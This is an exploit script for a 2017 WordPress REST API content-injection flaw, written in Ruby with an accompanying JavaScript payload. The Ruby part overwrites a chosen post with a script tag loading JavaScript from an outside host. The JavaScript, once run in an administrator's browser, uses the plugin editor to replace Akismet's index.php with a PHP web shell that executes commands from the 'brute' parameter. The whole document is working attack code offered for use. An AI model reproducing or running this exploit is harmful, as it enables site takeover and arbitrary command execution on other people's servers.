# Date: 31 Jan&#039; 2017
# Exploit Author: Harsh Jaiswal
# Tested on: Bacbox ubuntu Linux
# This will inject js in post, which on execution will change akismet plugin index.php file to our backdoor (brute parameter) :)
# Credits : Marc, Sucuri, Brute
# Lang : Ruby
 
require &#039;rest-client&#039;
require &#039;json&#039;
puts "Enter Target URI (With wp directory)"
targeturi = gets.chomp
puts "Enter Post ID"
postid = gets.chomp.to_i
response = RestClient.post(
  "#{targeturi}/index.php/wp-json/wp/v2/posts/#{postid}",
  {
    "id" => "#{postid}justtryingshell",
    "title" => "Shell Access Exploit",
    "content" => "Web shell access exploit <script src=&#039;http://yourjavascript.com/2211227783/wprce.js&#039;></script>"
  }.to_json,
  :content_type => :json,
  :accept => :json
) {|response, request, result| response }
if(response.code == 200)
puts "Done! After js execution in admin panel, you will have shell access at &#039;#{targeturi}/wp-content/plugins/akismet/index.php?brute=id&#039;"
else
puts "This site is not Vulnerable"
end
 
 
#--- wprce.js --- #
x=new XMLHttpRequest()
p=&#039;/wp-admin/plugin-editor.php?&#039;
f=&#039;file=akismet/index.php&#039;
x.open(&#039;GET&#039;,p+f,0)
x.send()
$=&#039;_wpnonce=&#039;+/ce" value="([^"]*?)"/.exec(x.responseText)[1]+&#039;&newcontent=<?=`$_GET[brute]`;&action=update&&#039;+f
x.open(&#039;POST&#039;,p+f,1)
x.setRequestHeader(&#039;Content-Type&#039;,&#039;application/x-www-form-urlencoded&#039;)
x.send($)
#--- EOF --- #

